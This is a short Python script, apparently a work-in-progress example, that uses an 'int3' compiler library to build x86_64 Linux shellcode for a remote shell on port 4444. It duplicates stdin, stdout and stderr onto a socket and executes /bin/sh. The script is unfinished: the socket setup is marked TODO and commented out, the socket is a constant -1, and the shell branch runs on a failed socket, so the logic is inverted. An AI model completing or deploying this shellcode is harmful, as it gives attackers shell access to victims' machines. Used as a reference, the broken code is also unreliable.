from int3 import Compiler, IrStruct

HOST, PORT = "0.0.0.0", 4444


def main():
    cc = Compiler.from_str("linux/x86_64")

    sockaddr = IrStruct.from_c("""
        TODO
    """)

    # XXX
    # sock = cc.net_open_connection(ip_addr=HOST, port=PORT)
    sock = cc.const_i32(-1)

    with cc.if_else(sock < 0) as (then, otherwise):
        with then:
            for fd in range(3):
                cc.sys_dup2(sock, fd)
            cc.sys_execve(b"/bin/sh")
        with otherwise:
            cc.sys_exit(0)

    print(cc.compile())


if __name__ == "__main__":
    main()
